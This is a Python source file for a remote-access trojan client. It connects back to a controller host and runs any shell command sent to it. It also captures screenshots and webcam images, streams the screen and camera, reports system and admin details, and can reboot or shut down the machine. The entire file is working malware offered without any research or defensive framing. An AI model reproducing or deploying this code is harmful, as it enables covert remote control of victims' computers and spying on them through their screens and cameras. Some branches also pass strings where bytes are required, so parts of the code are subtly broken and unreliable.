import socket
import platform
import os
import subprocess
import pyautogui
import ctypes
import time
import cv2
import threading
from vidstream import CameraClient, ScreenShareClient

# Helper functions
def system_info():
    return f"System: {platform.system()}\nNode: {platform.node()}\nRelease: {platform.release()}\nVersion: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}"

def execute_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except subprocess.CalledProcessError as e:
        return str(e.output.decode())

def send_data(sock, data):
    sock.sendall(data.encode())

def receive_data(sock):
    return sock.recv(1024).decode()

# Client code
def main():
    host = '127.0.0.1'
    port = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(platform.node().encode())  # Send hostname

    while True:
        command = s.recv(1024).decode()
        if command == 'exit':
            s.send(b'Exiting session...')
            break
        elif command == 'systeminfo':
            s.send(system_info().encode())
        elif command == 'reboot':
            os.system("shutdown /r /t 1")
            s.send(b'Reboot command executed.')
        elif command == 'shutdown':
            os.system("shutdown /s /t 1")
            s.send(b'Shutdown command executed.')
        elif command == 'cpu_cores':
            s.send(str(os.cpu_count()).encode())
        elif command == 'localtime':
            s.send(time.ctime().encode())
        elif command == 'ipconfig':
            s.send(execute_cmd('ipconfig'))
        elif command == 'tasklist':
            s.send(execute_cmd('tasklist'))
        elif command == 'sysinfo':
            s.send(execute_cmd('systeminfo'))
        elif command == 'isuseradmin':
            s.send(str(ctypes.windll.shell32.IsUserAnAdmin()).encode())
        elif command == 'screenshare':
            screen_client = ScreenShareClient(host, 8080)
            threading.Thread(target=screen_client.start_stream).start()
            s.send(b'Started screen sharing.')
        elif command == 'webcam':
            cam_client = CameraClient(host, 8080)
            threading.Thread(target=cam_client.start_stream).start()
            s.send(b'Started webcam streaming.')
        elif command == 'breakstream':
            s.send(b'Stream stopped (manual close needed).')
        elif command == 'screenshot':
            img = pyautogui.screenshot()
            img_path = 'screenshot.png'
            img.save(img_path)
            with open(img_path, 'rb') as f:
                s.sendfile(f)
        elif command == 'webcam_snap':
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam_snap.png", frame)
                with open("webcam_snap.png", 'rb') as f:
                    s.sendfile(f)
            cap.release()
        else:
            output = execute_cmd(command)
            s.send(output.encode())

    s.close()

if __name__ == '__main__':
    main()